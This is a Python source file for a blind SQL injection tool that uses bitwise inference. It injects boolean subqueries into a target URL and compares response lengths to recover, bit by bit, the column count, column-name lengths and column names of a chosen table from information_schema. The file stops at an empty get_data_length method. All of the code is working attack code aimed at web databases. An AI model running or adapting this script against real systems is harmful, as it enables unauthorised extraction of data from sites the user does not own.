import requests
from requests.utils import requote_uri
import bitwise_public


# First,if you want to get data,you know table name(db name?)

class GetTableDataClass:
    # insert your table name
    def __init__(self):
        self.SUCCESS_LENGTH = len(requests.get(bitwise_public.TARGET_URL).text)
        self.column_number = 0
        self.column_name_length = []
        self.column_name = []

    def get_column_number(self):
        number_bin_list = []
        for shift_idx in range(7, -1, -1):
            # Need know DB name
            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                      bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
                                                          """select count(*) from information_schema.columns
                                                          where table_name = '{0}'""".format(bitwise_public.TABLE_NAME),
                                                          shift_idx))).text)
            number_bin_list.append(int(res_length == self.SUCCESS_LENGTH))

        self.column_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
        print(self.column_number)

    def get_column_length(self):
        for column_idx in range(self.column_number):
            column_length_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                          bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select 
                                                          column_name from information_schema.columns where 
                                                          table_name = '{0}' limit {1},1""".format(
                                                              bitwise_public.TABLE_NAME,
                                                              column_idx),
                                                              shift_idx)))
                                 .text)
                column_length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))

            self.column_name_length.append(bitwise_public.parsing_bin_list_to_decimal(column_length_bin_list))

        print(self.column_name_length)

    def get_column_name(self):
        for column_idx in range(self.column_number):
            column_char_list = []
            for column_name_idx in range(self.column_name_length[column_idx]):
                column_name_char_bin_list = []
                for shift_idx in range(7, -1, -1):
                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                              bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
                                                              COLUMN_NAME from information_schema.columns 
                                                              where table_name = '{0}'
                                                              """.format(bitwise_public.TABLE_NAME),
                                                                                                        column_name_idx,
                                                                                                        shift_idx,
                                                                                                        column_idx)))
                                     .text)
                    column_name_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))

                column_char_list.append(bitwise_public.parsing_bin_list_to_char(column_name_char_bin_list))

            self.column_name.append(''.join(column_char_list))

    # Just get one data, so, you must get column information.
    def get_data_length(self):

